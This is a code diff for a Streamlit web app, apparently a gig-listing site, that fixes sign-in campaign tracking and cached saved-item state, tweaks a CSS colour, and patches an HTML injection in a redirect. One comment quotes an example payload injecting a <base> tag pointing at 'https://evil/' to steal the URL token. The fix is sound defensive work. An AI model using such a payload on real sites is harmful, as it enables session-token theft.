@@ -84,7 +84,7 @@ st.markdown("""
 :root{
   --bg:#121418; --bg2:#15181d; --panel:#171a20;
   --line:#262a31; --line2:#2f343d;
-  --ink:#ECEEF1; --ink2:#c3c8d0; --mute:#969da7; --faint:#6b7280;
+  --ink:#ECEEF1; --ink2:#c3c8d0; --mute:#969da7; --faint:#7d8590;
   --amber:#E8933A; --amber-l:#F7B569; --amber-d:#CB6F16;
   /* Vertical rhythm. The whole point is that these are DIFFERENT from each
      other — Streamlit ships one flat 16px between everything, which is why the
@@ -563,7 +563,7 @@ header[data-testid="stHeader"]{height:0;background:transparent}
   background:rgba(232,147,58,.10);border:1px solid rgba(232,147,58,.22);
   border-radius:999px;padding:3px 11px;white-space:nowrap}
 .gr-feat span::before{content:"✓ ";color:#eaa662;font-weight:700}
-.gr-cta-fine{text-align:center;font-size:11.5px;color:#6b7280;margin:9px 0 6px}
+.gr-cta-fine{text-align:center;font-size:11.5px;color:var(--faint);margin:9px 0 6px}
 .gr-mini{text-align:center;font-size:13px;color:#9aa1ab;margin:4px 0 8px}
 .gr-mini b{color:#eaa662;font-weight:700}
 
@@ -1149,7 +1149,25 @@ def _resolve_account():
         # beats a link that anyone could forward and an email box nobody checked.
         gmail = auth.google_email(st)
         if gmail:
-            acc, _ = accounts.sign_in(gmail, source="google")
+            # CAMPAIGN MUST BE PASSED HERE. This path had no campaign argument
+            # at all, so it defaulted to "" and PARTNER_GRANTS never matched —
+            # meaning a NextNW member who arrived on ?ref=nextnw and then chose
+            # "Continue with Google" was created on FREE, with no 90-day Pro,
+            # silently contradicting the offer the landing page just made them.
+            # Google sign-in is live in production, so this was the likeliest
+            # single way for the launch to go wrong.
+            #
+            # Read from session_state first (set during session init) and fall
+            # back to the live query param, because THIS function runs before
+            # that init block on a first load — the module-level CAMPAIGN
+            # constant is defined further down the file and simply does not
+            # exist yet at this point.
+            _camp = st.session_state.get("_campaign", "")
+            if not _camp:
+                _camp = analytics.campaign_label(
+                    st.query_params.get("ref", "")
+                    or st.query_params.get("utm_source", ""))
+            acc, _ = accounts.sign_in(gmail, source="google", campaign=_camp)
             if acc:
                 return acc
 
@@ -1174,6 +1192,10 @@ def _resolve_account():
 if st.query_params.get("signout"):
     _was_google = bool(auth.google_email(st))
     st.session_state.pop("_tok", None)
+    # Same reasoning as sign-in: cached-against-the-old-identity data has to go
+    # with the identity. Without this the nav still shows "Saved 7" to whoever
+    # sits down next on a shared machine.
+    st.session_state.pop("_saved_set", None)
     st.query_params.clear()
     if _was_google:
         st.logout()          # reruns on its own
@@ -3096,6 +3118,7 @@ def view_profile(pro):
                 # Drop our own session first, then Google's if it owns this
                 # login, otherwise st.logout() reruns and we never get here.
                 st.session_state.pop("_tok", None)
+                st.session_state.pop("_saved_set", None)   # see ?signout= above
                 st.query_params.clear()
                 if auth.google_email(st):
                     st.logout()
@@ -3336,6 +3359,15 @@ def sign_in_here(email: str, where: str):
         return False, "That doesn't look like an email address."
     st.session_state["_tok"] = acc["token"]
     st.query_params["u"] = acc["token"]
+    # Whoever this session was a moment ago, it isn't them now — drop anything
+    # cached against the old identity. Critically this includes the saved set:
+    # the nav badge calls saved_ids() on EVERY render including signed-out
+    # ones, so by the time someone finishes signing in it has already cached
+    # []. Leaving it means their stars all render hollow, and clicking one on
+    # a gig they had genuinely saved reads the real store and TOGGLES IT OFF —
+    # they press save and it silently deletes. Exactly the path anyone who
+    # lost their link and signed in again would take.
+    st.session_state.pop("_saved_set", None)
     note("signup" if is_new else "signin", where)
     return True, ""
 
@@ -3981,9 +4013,23 @@ if st.query_params.get("save"):
         st.session_state.pop("_saved_set", None)
     # Back to the page they were on, carrying the token so an email sign-in
     # isn't dropped by the round trip — same reasoning as ilink() everywhere.
-    _back = (st.query_params.get("from") or "gigs").lower()
+    #
+    # WHITELISTED, then escaped. `from` is attacker-controlled and was being
+    # dropped straight into a double-quoted attribute rendered with
+    # unsafe_allow_html — so `?from=x"><base href="https://evil/` closed the
+    # meta tag early and injected a <base>, against which the relative redirect
+    # (carrying ?u=<token>, which IS the credential here) would resolve. One
+    # emailed link, one click, token gone. The ?nav=out handler just below has
+    # always escaped its URL; this one didn't, and that inconsistency was the
+    # bug. Matching an allowed page by name means nothing arbitrary can reach
+    # the attribute at all — escaping alone would stop the injection but would
+    # still let a stranger's link decide where the visitor lands.
+    _allowed = {t.lower() for t in _TABS} | set(_SIDE_PAGES)
+    _raw = (st.query_params.get("from") or "").lower()
+    _back = _raw if _raw in _allowed else "gigs"
     st.markdown(
-        f'<meta http-equiv="refresh" content="0; url={ilink(f"?nav={_back}")}">',
+        f'<meta http-equiv="refresh" content="0; '
+        f'url={html.escape(ilink(f"?nav={_back}"), quote=True)}">',
         unsafe_allow_html=True)
     st.stop()
 
